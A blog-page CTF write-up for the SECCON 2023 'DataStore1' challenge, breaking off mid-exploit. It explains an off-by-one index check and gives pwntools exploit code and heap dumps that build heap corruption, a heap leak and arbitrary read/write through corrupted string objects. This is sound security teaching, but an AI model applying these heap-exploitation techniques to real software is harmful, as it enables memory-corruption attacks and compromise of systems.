<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>SECCON CTF 2023 Quals - DataStore1 | kileak</title>





<meta name="description" content="SECCON CTF 2023 Quals - DataStore1">


<meta name="keywords" content="seccon, datastore1">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2023/secconquals23-datastore1/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">SECCON CTF 2023 Quals - DataStore1</h1>
      <p class="post-meta">Sep 17, 2023</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>SECCON CTF 2023 Quals - DataStore1
<!--break--></p>

  <p>nc datastore1.seccon.games 4585</p>

  <p>Team: HK Guesser</p>

  <p>Attachment: 
<a href="https://kileak.github.io/assets/seccon23/datastore1/DataStore1.tar.gz">DataStore1.tar.gz</a> 
<a href="https://kileak.github.io/assets/seccon23/datastore1/xpl.py">xpl.py</a></p>
</blockquote>

<figure class="highlight"><pre><code class="language-text" data-lang="text">MENU
1. Edit
2. List
0. Exit
&gt; 1

Current: &lt;EMPTY&gt;
Select type: [a]rray/[v]alue
&gt; a
input size: 4

MENU
1. Edit
2. List
0. Exit
&gt; 2

List Data
&lt;ARRAY(4)&gt;
[00] &lt;EMPTY&gt;
[01] &lt;EMPTY&gt;
[02] &lt;EMPTY&gt;
[03] &lt;EMPTY&gt;

MENU
1. Edit
2. List
0. Exit
&gt; </code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">DataStore1</code> lets us create a hierarchic data structure, which could consist of arrays, strings, ints and floats on different levels (which made scripting this a pain first).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">enum</span> <span class="p">{</span>
	<span class="n">TYPE_EMPTY</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
	<span class="n">TYPE_ARRAY</span> <span class="o">=</span> <span class="mh">0xfeed0001</span><span class="p">,</span>
	<span class="n">TYPE_STRING</span><span class="p">,</span>
	<span class="n">TYPE_UINT</span><span class="p">,</span>
	<span class="n">TYPE_FLOAT</span><span class="p">,</span>
<span class="p">}</span> <span class="n">type_t</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
	<span class="n">type_t</span> <span class="n">type</span><span class="p">;</span>

	<span class="k">union</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">Array</span> <span class="o">*</span><span class="n">p_arr</span><span class="p">;</span>
		<span class="k">struct</span> <span class="n">String</span> <span class="o">*</span><span class="n">p_str</span><span class="p">;</span>
		<span class="kt">uint64_t</span> <span class="n">v_uint</span><span class="p">;</span>
		<span class="kt">double</span> <span class="n">v_float</span><span class="p">;</span>
	<span class="p">};</span>
<span class="p">}</span> <span class="n">data_t</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Array</span> <span class="p">{</span>
	<span class="kt">size_t</span> <span class="n">count</span><span class="p">;</span>
	<span class="n">data_t</span> <span class="n">data</span><span class="p">[];</span>
<span class="p">}</span> <span class="n">arr_t</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">String</span> <span class="p">{</span>
	<span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
<span class="p">}</span> <span class="n">str_t</span><span class="p">;</span></code></pre></figure>

<p>So on every level in <code class="language-plaintext highlighter-rouge">data_t</code>, we can have a different data type (which is stored at the same address, since it uses <code class="language-plaintext highlighter-rouge">union</code>). Depending on <code class="language-plaintext highlighter-rouge">type</code>, the type will be interpreted differently.</p>

<p>The bug for this challenge is in the <code class="language-plaintext highlighter-rouge">edit</code> function</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"index: "</span><span class="p">);</span>
<span class="kt">unsigned</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">getint</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="n">arr</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span></code></pre></figure>

<p>In the boundary check we have an off-by-one, since it checks that <code class="language-plaintext highlighter-rouge">idx</code> is not bigger than <code class="language-plaintext highlighter-rouge">arr-&gt;count</code> (though it should check for greater or equal). This allows us to update/delete one <code class="language-plaintext highlighter-rouge">data_t</code> object “behind” the current type, overwriting followup data on the heap.</p>

<p>As an example, if we have another array stored behind the current <code class="language-plaintext highlighter-rouge">data_t</code> object, this would allow us to overwrite <code class="language-plaintext highlighter-rouge">count</code> of that, corrupting the size of the following array.</p>

<p>We just have to be careful while corrupting other data types, since the binary will often call <code class="language-plaintext highlighter-rouge">show</code> on our data types, and if it encounters an <code class="language-plaintext highlighter-rouge">unknown</code> data type, it will abort.</p>

<p>For the start, we’d need a leak to the heap to be able to create useful objects.</p>

<ul>
  <li>Create one initial array with size 1</li>
  <li>Create four sub arrays</li>
  <li>Use the oob access on the second sub array to <code class="language-plaintext highlighter-rouge">delete</code> the fourth entry (which points to the count of the third sub array)</li>
  <li>Create another array type in the fourth entry of the second sub array (which will create a pointer to the array type in the <code class="language-plaintext highlighter-rouge">count</code> of the third sub array)</li>
</ul>

<p>Sounds confusing? Well, it was in the beginning :)</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

    <span class="c1"># create initial array
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create initial array"</span><span class="p">)</span>

    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create sub arrays"</span><span class="p">)</span>
    <span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite array size with another array"</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span></code></pre></figure>

<p>Let’s see, how this looks like on the heap.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Create initial array

0x555555559290:	0x0000000000000000	0x0000000000000021 
0x5555555592a0:	0x00000000feed0001	0x00005555555592c0 &lt;= type / array ptr
0x5555555592b0:	0x0000000000000000	0x0000000000000021
0x5555555592c0:	0x0000000000000001	0x0000000000000000 &lt;= initial array: count
0x5555555592d0:	0x0000000000000000	0x0000000000020d31

Create sub arrays

0x555555559290:	0x0000000000000000	0x0000000000000021
0x5555555592a0:	0x00000000feed0001	0x00005555555592c0 &lt;= type / array ptr
0x5555555592b0:	0x0000000000000000	0x0000000000000021
0x5555555592c0:	0x0000000000000001	0x00000000feed0001 &lt;= initial array: count / type
0x5555555592d0:	0x00005555555592e0	0x0000000000000051 &lt;= array ptr
0x5555555592e0:	0x0000000000000004	0x00000000feed0001 &lt;= sub array (0)
0x5555555592f0:	0x0000555555559330	0x00000000feed0001
0x555555559300:	0x0000555555559380	0x00000000feed0001
0x555555559310:	0x00005555555593d0	0x00000000feed0001
0x555555559320:	0x0000555555559420	0x0000000000000051
0x555555559330:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/0)
0x555555559340:	0x0000000000000000	0x0000000000000000
0x555555559350:	0x0000000000000000	0x0000000000000000
0x555555559360:	0x0000000000000000	0x0000000000000000
0x555555559370:	0x0000000000000000	0x0000000000000051
0x555555559380:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/1)
0x555555559390:	0x0000000000000000	0x0000000000000000
0x5555555593a0:	0x0000000000000000	0x0000000000000000
0x5555555593b0:	0x0000000000000000	0x0000000000000000
0x5555555593c0:	0x0000000000000000	0x0000000000000051
0x5555555593d0:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/2)
0x5555555593e0:	0x0000000000000000	0x0000000000000000
0x5555555593f0:	0x0000000000000000	0x0000000000000000
0x555555559400:	0x0000000000000000	0x0000000000000000
0x555555559410:	0x0000000000000000	0x0000000000000051
0x555555559420:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/3)
0x555555559430:	0x0000000000000000	0x0000000000000000
0x555555559440:	0x0000000000000000	0x0000000000000000
0x555555559450:	0x0000000000000000	0x0000000000000000
0x555555559460:	0x0000000000000000	0x0000000000020ba1

Deleting element (0/1/4)

0x555555559290:	0x0000000000000000	0x0000000000000021
0x5555555592a0:	0x00000000feed0001	0x00005555555592c0
0x5555555592b0:	0x0000000000000000	0x0000000000000021
0x5555555592c0:	0x0000000000000001	0x00000000feed0001
0x5555555592d0:	0x00005555555592e0	0x0000000000000051
0x5555555592e0:	0x0000000000000004	0x00000000feed0001
0x5555555592f0:	0x0000555555559330	0x00000000feed0001
0x555555559300:	0x0000555555559380	0x00000000feed0001
0x555555559310:	0x00005555555593d0	0x00000000feed0001
0x555555559320:	0x0000555555559420	0x0000000000000051
0x555555559330:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/0)
0x555555559340:	0x0000000000000000	0x0000000000000000
0x555555559350:	0x0000000000000000	0x0000000000000000
0x555555559360:	0x0000000000000000	0x0000000000000000
0x555555559370:	0x0000000000000000	0x0000000000000051
0x555555559380:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/1)
0x555555559390:	0x0000000000000000	0x0000000000000000
0x5555555593a0:	0x0000000000000000	0x0000000000000000
0x5555555593b0:	0x0000000000000000	0x0000000000000000
0x5555555593c0:	0x0000000000000000	0x0000000000000000
0x5555555593d0:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/2)
0x5555555593e0:	0x0000000000000000	0x0000000000000000
0x5555555593f0:	0x0000000000000000	0x0000000000000000
0x555555559400:	0x0000000000000000	0x0000000000000000
0x555555559410:	0x0000000000000000	0x0000000000000051
0x555555559420:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/3)
0x555555559430:	0x0000000000000000	0x0000000000000000
0x555555559440:	0x0000000000000000	0x0000000000000000
0x555555559450:	0x0000000000000000	0x0000000000000000
0x555555559460:	0x0000000000000000	0x0000000000020ba1</code></pre></figure>

<p>Note, how the chunk size of the second sub array is now zeroed out. This allows us to now do an <code class="language-plaintext highlighter-rouge">update</code> on this element (otherwise <code class="language-plaintext highlighter-rouge">show</code> would have aborted, since <code class="language-plaintext highlighter-rouge">0x21</code> would have counted as an <code class="language-plaintext highlighter-rouge">unknown</code> data type)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Update element (0/1/4) with an array type

0x555555559290:	0x0000000000000000	0x0000000000000021
0x5555555592a0:	0x00000000feed0001	0x00005555555592c0
0x5555555592b0:	0x0000000000000000	0x0000000000000021
0x5555555592c0:	0x0000000000000001	0x00000000feed0001
0x5555555592d0:	0x00005555555592e0	0x0000000000000051
0x5555555592e0:	0x0000000000000004	0x00000000feed0001
0x5555555592f0:	0x0000555555559330	0x00000000feed0001
0x555555559300:	0x0000555555559380	0x00000000feed0001
0x555555559310:	0x00005555555593d0	0x00000000feed0001
0x555555559320:	0x0000555555559420	0x0000000000000051
0x555555559330:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/0)
0x555555559340:	0x0000000000000000	0x0000000000000000
0x555555559350:	0x0000000000000000	0x0000000000000000
0x555555559360:	0x0000000000000000	0x0000000000000000
0x555555559370:	0x0000000000000000	0x0000000000000051
0x555555559380:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/1)
0x555555559390:	0x0000000000000000	0x0000000000000000
0x5555555593a0:	0x0000000000000000	0x0000000000000000
0x5555555593b0:	0x0000000000000000	0x0000000000000000
0x5555555593c0:	0x0000000000000000	0x00000000feed0001
0x5555555593d0:	0x0000555555559470	0x0000000000000000 &lt;= sub array (0/2) (count == array ptr)
0x5555555593e0:	0x0000000000000000	0x0000000000000000
0x5555555593f0:	0x0000000000000000	0x0000000000000000
0x555555559400:	0x0000000000000000	0x0000000000000000
0x555555559410:	0x0000000000000000	0x0000000000000051
0x555555559420:	0x0000000000000004	0x0000000000000000 &lt;= sub array (0/3)
0x555555559430:	0x0000000000000000	0x0000000000000000
0x555555559440:	0x0000000000000000	0x0000000000000000
0x555555559450:	0x0000000000000000	0x0000000000000000
0x555555559460:	0x0000000000000000	0x00000000000000b1</code></pre></figure>

<p>Creating an array type in the fourth element of the second sub array now put the pointer to the array in the <code class="language-plaintext highlighter-rouge">count</code> property of the third sub array. We can use this to leak the heap address by doing an <code class="language-plaintext highlighter-rouge">edit</code>, while NOT editing the third sub array itself (which would again lead to an abort).</p>

<p>Since we have created an array above that, we can go into edit mode, which will show us the sizes of the sub array (and the size of the third array now happens to be <code class="language-plaintext highlighter-rouge">0x0000555555559470</code>)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[47971]
[*] Create initial array
[*] Create sub arrays
[*] Overwrite array size with another array
[*] Switching to interactive mode
$ 1

Current: &lt;ARRAY(1)&gt;
[00] &lt;ARRAY(4)&gt;
index: $ 0

1. Update
2. Delete
&gt; $ 1

Current: &lt;ARRAY(4)&gt;
[00] &lt;ARRAY(4)&gt;
[01] &lt;ARRAY(4)&gt;
[02] &lt;ARRAY(93824992253040)&gt;
[03] &lt;ARRAY(4)&gt;
index: $  </code></pre></figure>

<p>We can read the array size here and then just edit another value to get out of edit mode again.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak heap address from array size"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[02] &lt;ARRAY("</span><span class="p">)</span>
<span class="n">LEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">")"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"v"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">100</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">HEAPBASE</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0x470</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP leak     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>    
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP base     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="p">))</span></code></pre></figure>

<p>With a heap leak, we can now start creating data types, which gives us a bit more control, where to read and write from. String objects are perfect for this.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">String</span> <span class="p">{</span>
	<span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
<span class="p">}</span> <span class="n">str_t</span><span class="p">;</span></code></pre></figure>

<p>They contain a <code class="language-plaintext highlighter-rouge">size</code>, which controls, how much can be read or written to them and a pointer, where we can read/write. Controlling such a datatype would give us an arbitrary read/write primitive.</p>

<p>Let’s start putting some string objects on the heap</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create strings on heap"</span><span class="p">)</span>
<span class="n">updatevalue</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">updatevalue</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">updatevalue</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559460:	0x0000000000000000	0x00000000000000b1
0x555555559470:	0x000000000000000a	0x0000000000000000 &lt;= sub array (0/1/4)
0x555555559480:	0x0000000000000000	0x0000000000000000
0x555555559490:	0x0000000000000000	0x0000000000000000
0x5555555594a0:	0x0000000000000000	0x0000000000000000
0x5555555594b0:	0x0000000000000000	0x0000000000000000
0x5555555594c0:	0x0000000000000000	0x0000000000000000
0x5555555594d0:	0x0000000000000000	0x0000000000000000
0x5555555594e0:	0x0000000000000000	0x0000000000000000
0x5555555594f0:	0x0000000000000000	0x0000000000000000
0x555555559500:	0x0000000000000000	0x0000000000000000
0x555555559510:	0x0000000000000000	0x0000000000000021
0x555555559520:	0x0000000000000008	0x0000555555559590 &lt;= size / content ptr (1)
0x555555559530:	0x0000000000000000	0x0000000000000051
0x555555559540:	0x0000000555555559	0x914996d08fbb6b99
0x555555559550:	0x0000000000000000	0x0000000000000000
0x555555559560:	0x0000000000000000	0x0000000000000000
0x555555559570:	0x0000000000000000	0x0000000000000000
0x555555559580:	0x0000000000000000	0x0000000000000021
0x555555559590:	0x4141414141414141	0x0000000000000000 &lt;= string content (1)
0x5555555595a0:	0x0000000000000000	0x0000000000000051
0x5555555595b0:	0x000055500000c019	0x914996d08fbb6b99
0x5555555595c0:	0x0000000000000000	0x0000000000000000
0x5555555595d0:	0x0000000000000000	0x0000000000000000
0x5555555595e0:	0x0000000000000000	0x0000000000000000
0x5555555595f0:	0x0000000000000000	0x0000000000000021
0x555555559600:	0x4141414141414141	0x0000000000000000 &lt;= string content (2)
0x555555559610:	0x0000000000000000	0x0000000000000051
0x555555559620:	0x000055500000c0e9	0x914996d08fbb6b99
0x555555559630:	0x0000000000000000	0x0000000000000000
0x555555559640:	0x0000000000000000	0x0000000000000000
0x555555559650:	0x0000000000000000	0x0000000000000000
0x555555559660:	0x0000000000000000	0x0000000000000021
0x555555559670:	0x0000000000000008	0x0000555555559600 &lt;= size / content ptr (2)
0x555555559680:	0x0000000000000000	0x0000000000000021
0x555555559690:	0x4141414141414141	0x0000000000000000 &lt;= string content (3)
0x5555555596a0:	0x0000000000000000	0x0000000000000051
0x5555555596b0:	0x000055500000c379	0x914996d08fbb6b99
0x5555555596c0:	0x0000000000000000	0x0000000000000000
0x5555555596d0:	0x0000000000000000	0x0000000000000000
0x5555555596e0:	0x0000000000000000	0x0000000000000000
0x5555555596f0:	0x0000000000000000	0x0000000000000021
0x555555559700:	0x0000000000000008	0x0000555555559690 &lt;= size / content ptr (3)
0x555555559710:	0x0000000000000000	0x00000000000208f1</code></pre></figure>

<p>So, now we have some strings located behind the subarray <code class="language-plaintext highlighter-rouge">(0/1/4)</code>, which has a size of <code class="language-plaintext highlighter-rouge">10</code>.</p>

<p>We still have no <code class="language-plaintext highlighter-rouge">libc</code> address on the heap though. For this we’d need to free a bigger chunk to put it in unsorted bin. So, before doing something with those string objects, let’s just fill up the heap to move <code class="language-plaintext highlighter-rouge">top</code> pointer down, making it easier to put a fake chunk somewhere.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Fillup heap"</span><span class="p">)</span>
<span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
<span class="n">createarray</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span></code></pre></figure>

<p>We’ll now have some more chunks below the string objects, so that we can create a bigger fake chunk, point a string to it, <code class="language-plaintext highlighter-rouge">free</code> it, to pull a <code class="language-plaintext highlighter-rouge">main_arena</code> pointer in the heap, and then overwrite a string again to point to it, to leak it.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># delete 10th element to avoid unknown datatype
</span><span class="n">delete</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>

<span class="c1"># overwrite string length
</span><span class="n">updatevalue</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">10</span><span class="p">],</span> <span class="s">"1000"</span><span class="p">)</span></code></pre></figure>

<p>First we <code class="language-plaintext highlighter-rouge">delete</code> the 10th element of the sub arry <code class="language-plaintext highlighter-rouge">0/1/4</code>. By doing this, we can edit it, without <code class="language-plaintext highlighter-rouge">show</code> aborting because of an unknown datatype (The 10th element of <code class="language-plaintext highlighter-rouge">0/1/4</code> is where the <code class="language-plaintext highlighter-rouge">str_t</code> for the first string is located).</p>

<p>Then we can update the 10th element of sub array <code class="language-plaintext highlighter-rouge">0/1/4</code> with <code class="language-plaintext highlighter-rouge">1000</code>, which will overwrite the size of the first string pointer to <code class="language-plaintext highlighter-rouge">1000</code>, enabling us to overwrite anything behind it.</p>

<p>Memory layout after those steps:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559410:	0x0000000000000000	0x0000000000000051
0x555555559420:	0x0000000000000004	0x00000000feed0001 &lt;= sub array 0/3
0x555555559430:	0x0000555555559720	0x00000000feed0001
0x555555559440:	0x00005555555597d0	0x00000000feed0001
0x555555559450:	0x0000555555559880	0x00000000feed0001
0x555555559460:	0x0000555555559930	0x00000000000000b1
0x555555559470:	0x000000000000000a	0x0000000000000000 &lt;= sub array 0/1/4
0x555555559480:	0x0000000000000000	0x0000000000000000
0x555555559490:	0x0000000000000000	0x0000000000000000
0x5555555594a0:	0x0000000000000000	0x0000000000000000
0x5555555594b0:	0x0000000000000000	0x0000000000000000
0x5555555594c0:	0x0000000000000000	0x0000000000000000
0x5555555594d0:	0x0000000000000000	0x0000000000000000
0x5555555594e0:	0x0000000000000000	0x0000000000000000
0x5555555594f0:	0x0000000000000000	0x0000000000000000
0x555555559500:	0x0000000000000000	0x0000000000000000
0x555555559510:	0x0000000000000000	0x00000000feed0003
0x555555559520:	0x00000000000003e8	0x0000555555559590 &lt;= count / ptr of first string
0x555555559530:	0x0000000000000000	0x0000000000000051
0x555555559540:	0x0000000555555559	0x65e7b9b32841f470
0x555555559550:	0x0000000000000000	0x0000000000000000
0x555555559560:	0x0000000000000000	0x0000000000000000
0x555555559570:	0x0000000000000000	0x0000000000000000
0x555555559580:	0x0000000000000000	0x0000000000000021
0x555555559590:	0x4141414141414141	0x0000000000000000 &lt;= first string pointing here
0x5555555595a0:	0x0000000000000000	0x0000000000000051
0x5555555595b0:	0x000055500000c019	0x65e7b9b32841f470
0x5555555595c0:	0x0000000000000000	0x0000000000000000
0x5555555595d0:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>With a size of <code class="language-plaintext highlighter-rouge">1000</code> we can now <code class="language-plaintext highlighter-rouge">update</code> the string overwriting everything behind it. We’ll be using this to corrupt another string to point to a <code class="language-plaintext highlighter-rouge">0x560</code> chunk, free it and then leak it.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Corrupting string pointer"</span><span class="p">)</span>
